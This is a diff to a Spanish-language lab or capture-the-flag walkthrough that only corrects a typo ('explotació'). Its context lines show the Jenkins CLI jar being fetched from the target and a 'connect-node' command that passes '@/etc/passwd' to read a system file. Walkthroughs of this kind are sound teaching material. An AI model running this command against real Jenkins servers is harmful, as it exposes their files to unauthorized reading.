@@ -72,7 +72,7 @@ Si nos leemos ese post vemos como realizar la explotación. Para ello necesitamo
 wget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar
 ```
 
-Una vez tengamos la herramienta podemos empezar con la explotació.
+Una vez tengamos la herramienta podemos empezar con la explotación.
 
 ```bash
 ❯ java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' connect-node '@/etc/passwd' 2>&1
